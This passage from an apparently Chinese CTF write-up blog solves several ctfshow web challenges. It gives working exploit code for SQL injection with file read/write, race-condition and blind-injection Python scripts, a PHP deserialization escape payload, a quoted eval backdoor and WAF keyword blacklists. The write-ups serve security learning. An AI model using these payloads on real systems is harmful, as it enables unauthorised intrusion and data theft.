<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/load_file(&quot;/real_flag_is_here&quot;)%23</span><br><span class="line">=&gt;alert(&#x27;ctfshow&#123;8eb644ba-4766-41b1-a638-34e2fe5f5312&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>或者从代码里可以看出来要判断$file中是否存在”ctf.show”字符串，也可以通过into outfile函数写文件到&#x2F;tmp&#x2F;gtf1y中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?query=-1/**/union/**/select/**/&quot;ctf.show&quot;/**/into/**/outfile(&quot;/tmp/gtf1y&quot;)%23</span><br></pre></td></tr></table></figure>

<p>然后直接访问secret.php，也能弹出flag</p>
<h2 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h2><p>扫目录有web.zip泄露，对页面审计发现有主要函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">function ctfshow(token,data)&#123;</span><br><span class="line"></span><br><span class="line">			var oReq = new XMLHttpRequest();</span><br><span class="line">			oReq.open(&quot;POST&quot;, &quot;check.php?token=&quot;+token+&quot;&amp;php://input&quot;, true);</span><br><span class="line">			oReq.onload = function (oEvent) &#123;</span><br><span class="line">				if(oReq.status===200)&#123;</span><br><span class="line">						var res=eval(&quot;(&quot;+oReq.response+&quot;)&quot;);</span><br><span class="line">						if(res.success ==1 &amp;&amp;res.error!=1)&#123;</span><br><span class="line">							alert(res.msg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">						if(res.error ==1)&#123;</span><br><span class="line">							alert(res.errormsg);</span><br><span class="line">							return;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				return;</span><br><span class="line">			&#125;;</span><br><span class="line">			oReq.send(data);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>结合web.zip中的check.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="variable">$receiveFile</span>)!=<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha512&quot;</span>,<span class="string">&quot;key.dat&quot;</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;success&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;人脸识别成功!<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;same file&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;md5 error&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;errormsg&#x27;</span>]=<span class="string">&quot;token error&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<p>随便传个东西过去发现直接报md5 error，就是md5校验那里没过，再跟踪一下receiveStreamFile函数看一下他在做什么</p>
<p>$streamData从php:&#x2F;&#x2F;input里接收数据流，然后通过file_put_contents写入到$receiveFile中</p>
<p>遇到了挺多次的小点，记录一下为什么php:&#x2F;&#x2F;input传不进去文件的问题</p>
<blockquote>
<p>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
</blockquote>
<p>而$receiveFile已经写死是flag.dat，那唯一可控的就是传输过去的数据流</p>
<p>可以直接把key.dat下下来，就可以得到目标文件的data，现在就需要想怎么把本地的key.dat传到服务器里</p>
<p>那就可以本地给个上传前端（红包题第二弹），然后在bp里稍微改一下data就能绕过md5</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309231940594.png" alt="image-20230923194044472"></p>
<p>还要把文件尾的回车删掉，这时就能弹出same file的报错。这说明md5相等而且sha512也相等</p>
<p>这个时候看了网上大部分wp，都说是md5碰撞，但其实不是的。这是<strong>条件竞争</strong></p>
<p>两个if判断中必然会有时间差，要利用这个时间差把flag.dat再次替换一遍，才可以做到绕过sha512</p>
<p>如果单纯利用fastcoll，是碰撞不出来和key.dat有相同md5的文件，这也是我看了很久想不明白的点</p>
<p>而条件竞争通常需要python的多线程操作。这里有特殊字符，bp经常会自动给你加payload导致和源文件不一致，所以使用python的thread模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d6d06d87-f806-48a0-a282-a653e47e9fb6.challenge.ctf.show/check.php?token=70efdf2ec9b086079795c442636b55fb&amp;php://input&quot;</span><br><span class="line"></span><br><span class="line">def POST(data):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        pass</span><br><span class="line">    except  Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        pass</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">with open(&#x27;key.dat&#x27;,&#x27;rb&#x27;) as k:</span><br><span class="line">    data = k.read()</span><br><span class="line">    pass</span><br><span class="line">for i in range(500):</span><br><span class="line">    threading.Thread(target = POST,args = (data,)).start()</span><br><span class="line">    threading.Thread(target = POST,args = (&quot;test&quot;,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309232231933.png" alt="image-20230923222239758"></p>
<h2 id="红包题第七弹"><a href="#红包题第七弹" class="headerlink" title="红包题第七弹"></a>红包题第七弹</h2><p>咋一看没东西，扫网发现有git泄露</p>
<p>用githack失败了，那就换用Git_Extract，把git扒下来，发现有backdoor.php的后门一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@eval($_POST[&#x27;Letmein&#x27;]);</span><br></pre></td></tr></table></figure>

<p>直接进去打，但是禁用的函数太多，没法rce。先连个蚁剑找到flag在&#x2F;var&#x2F;www下</p>
<p>可以直接用highlight_file显示出来</p>
<h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>唉，最低能的弱口令。得找个时间把字典好好整理一下了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u=admin&amp;p=admin888</span><br></pre></td></tr></table></figure>

<h2 id="CTFshow-web1"><a href="#CTFshow-web1" class="headerlink" title="CTFshow web1"></a>CTFshow web1</h2><p>扫网发现<a href="http://www.zip,打开发现连了web15的数据库,函数大概是全禁了/">www.zip，打开发现连了web15的数据库，函数大概是全禁了</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;,$username))</span><br></pre></td></tr></table></figure>

<p>里边有个user_main.php，但是并不会直接给你放出pwd</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309241734589.png" alt="image-20230924173415512"></p>
<p>注意得到，执行的sql语句是<code>select * from user order by $order</code>，而order是可以操控的位置，当使用pwd的时候，就会使用pwd来排序。如果密码排序&gt;flag，排序就会靠上。这个时候就得考虑盲注了</p>
<p>这里给出二分法的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">regurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/reg.php&quot;</span></span><br><span class="line">queurl = <span class="string">&quot;http://0d2d0247-36d5-4d3e-bb8f-98a64bc16ccd.challenge.ctf.show/user_main.php?order=pwd&quot;</span></span><br><span class="line">key = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="comment"># 注册项目</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> mid &lt; <span class="built_in">max</span>:</span><br><span class="line">        c = key[mid]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now playload:&quot;</span>, c)</span><br><span class="line">        raw_data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: flag + c,</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: flag + c,</span><br><span class="line">        &#125;</span><br><span class="line">        s = requests.session()</span><br><span class="line">        reg = s.post(url = regurl,</span><br><span class="line">                     data = raw_data,</span><br><span class="line">                     headers = &#123;</span><br><span class="line">                         <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">                     &#125;)</span><br><span class="line">        que = requests.get(url = queurl, headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=31f1f4341531ede15606ff7a99b5ec08&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        p_t = que.text.index(flag + c)</span><br><span class="line">        p_flag = que.text.index(<span class="string">&quot;flag_is_my_password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> p_t &gt; p_flag:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    flag = flag + key[mid - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于很多&lt;&gt;等特殊符号被禁用了，所以直接指定key。而且mysql排序并不是按ascii码排序。当字母不同，按字母表顺序排列；当同字母，先小写后大写</p>
<h2 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=null;</span><br><span class="line">    public $nickname=null;</span><br><span class="line">    public function login() &#123;</span><br><span class="line">        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">        $mysqli=new dbCtrl();</span><br><span class="line">        $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);</span><br><span class="line">        if($this-&gt;id)&#123;</span><br><span class="line">        $_SESSION[&#x27;id&#x27;]=$this-&gt;id;  </span><br><span class="line">        $_SESSION[&#x27;login&#x27;]=1;</span><br><span class="line">        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];</span><br><span class="line">        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];</span><br><span class="line">        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">        return $this-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public function update()&#123;</span><br><span class="line">        $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">        //这个功能还没有写完 先占坑</span><br><span class="line">    &#125;</span><br><span class="line">    public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        return file_get_contents($this-&gt;nickname);//危</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;noob123&quot;;</span><br><span class="line">    public $dbpass=&quot;noob123&quot;;</span><br><span class="line">    public $database=&quot;noob123&quot;;</span><br><span class="line">    public $name;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$_POST[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$_POST[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;token=$_SESSION[&#x27;token&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#x27;用户不存在!&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            echo(&#x27;密码错误！&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    public function update($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        //还没来得及写</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题涉及到了反序列化字符串逃逸。</p>
<blockquote>
<p><strong>PHP在进行反序列化的时候，只要前面的字符串符合反序列化的规则并能成功反序列化，那么将忽略后面多余的字符串</strong></p>
</blockquote>
<p>把<a href="http://www.zip扒下来，看得到只有`$_SESSION[&#39;login&#39;]===1`的时候才能弹出flag">www.zip扒下来，看得到只有`$_SESSION[&#39;login&#39;]===1`的时候才能弹出flag</a></p>
<p>但是只有User::login()中才会对<code>$_SESSION[&#39;login&#39;]</code>进行赋值</p>
<p>而赋值的条件得是token&#x3D;admin或者password&#x3D;数据库中password</p>
<p>通过分析可知，User::login()其实就是写死了dbCtl::login()的查询语句，但是我们可以通过链子自己构造sql语句</p>
<p>UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__Call-&gt;dbCtrl::login()</p>
<p>这样如果第一次打通了，会触发<code>$_SESSION[&#39;token&#39;]=&quot;admin&quot;</code></p>
<p>第二次再次登陆的时候，会直接判断dbCtrl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以绕过密码的验证</p>
<p>唯一的问题就是Info在构造的时候并不会构造$CtrlCase，导致无法进__call函数</p>
<p>但是safe函数可以帮助绕过该限制（字符串逃逸漏洞）</p>
<p>尝试传<code>age=1&amp;nickname=2</code></p>
<p>传出的反序列化字符串为</p>
<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
<p>说明可控的只有age和nickname两个字段，最后的CtrlCase无法传入。但是由于safe的函数的出现，使得逃逸成为了可能</p>
<p>当传入<code>age=1&amp;nickname=union</code>时</p>
<p>传出的反序列化字符串变成了</p>
<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
<p>这样<code>s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;</code>就出错了，因为其中的s:5仅与传入的nickname的值的长度有关，而hacker是6位。这是因为safe函数会把一些单词替换</p>
<p>那就可以自行构造一个序列化字符串进去，强行把后面的CtrlCase构造出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;nickname = new Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;CtrlCase = new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UpdateHelper&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;sql = new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl&#123;</span><br><span class="line">    public $name = &quot;admin&quot;;</span><br><span class="line">    public $password = &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$u = new UpdateHelper();</span><br><span class="line">$len = strlen(&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;);</span><br><span class="line">$payload = str_repeat(&#x27;union&#x27;, $len).&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure>

<p>这样就构造出了payload，把payload作为nickname传入</p>
<p>由于safe会把union修改为hacker（字符数+1），只要我们传入一定长度的union，就可以让<code>s:8:&quot;nickname&quot;;s:1920:</code>其中的s:1920全部变成hacker，从而使后面我们自行构造的CtrlCase逃出</p>
<p>当我们传入的sql语句<code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>不管username是什么，始终返回1,c4ca4238a0b923820dcc509a6f75849b</p>
<p>而在传入payload的时候就指定<code>public $password = &#39;1&#39;</code>，就可以通过<code>if (md5($this-&gt;password)!==$passwordResult)</code>这条语句成功赋值session</p>
<p>在最后添加一个}来提前结束反序列化，由于反序列化的特性，成功后将忽略后面多余的字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202310152238698.png" alt="image-20231015223831637"></p>
<p>打进去之后我们的$_SESSION[‘token’]&#x3D;admin，再次访问login就能通过验证弹出flag</p>
<h2 id="Fishman"><a href="#Fishman" class="headerlink" title="Fishman"></a>Fishman</h2><p>这题有一个注入点可以打</p>
<p>但是有个waf，会遍历所有get，post，cookie参数，在黑名单两侧加上@从而阻止注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$blacklist = &#x27;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#x27;;</span><br></pre></td></tr></table></figure>

<p>但在member.php中有一条json_decode操作，而json_decode会将传入的unicode自动解码，这就提供了条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($_COOKIE[&quot;login_data&quot;]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[&#x27;login_data&#x27;], true);</span><br><span class="line">        $admin_user = $login_data[&#x27;admin_user&#x27;];</span><br><span class="line">        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#x27;$admin_user&#x27; limit 1&quot;);</span><br><span class="line">        if ($udata[&#x27;username&#x27;] == &#x27;&#x27;) &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[&#x27;password&#x27;] . LOGIN_KEY);</span><br><span class="line">        if ($admin_pass == $login_data[&#x27;admin_pass&#x27;]) &#123;</span><br><span class="line">            $islogin = 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以从返回的setcookie来判断是否成功，给个poc进行验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &quot;include/safe.php&quot;;</span><br><span class="line">var_dump($_COOKIE[&#x27;test&#x27;]);</span><br><span class="line">$login_data = json_decode($_COOKIE[&#x27;test&#x27;], true);</span><br><span class="line">var_dump($login_data);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311251444061.png" alt="image-20231125144412967"></p>
<p>而member.php必须从common.php里打，所以就有exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">url = &quot;http://127.0.0.1:7788/poc.php&quot;</span><br><span class="line"># $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#x27;$admin_user&#x27; limit 1&quot;);</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    min = 33</span><br><span class="line">    max = 127</span><br><span class="line">    mid = (min + max) // 2</span><br><span class="line">    while min &lt; max:</span><br><span class="line">        payload = &quot;&#x27; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; #&quot;.format(i, mid)</span><br><span class="line">        cookie = &#x27;islogin=1;login_data=&#123;&#123;&quot;admin_user&quot;:&quot;&#123;payload&#125;&quot;,&quot;admin_pass&quot;:65&#125;&#125;&#x27;.format(payload = payload)</span><br><span class="line">        headers = &#123;&#x27;cookie&#x27;: cookie&#125;</span><br><span class="line">        re = requests.get(url = url, headers = headers)</span><br><span class="line">        setcookie = str(re.headers)</span><br><span class="line">        if setcookie.count(&quot;islogin&quot;) == 2:</span><br><span class="line">            min = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            max = mid</span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">    if chr(mid) == &quot; &quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

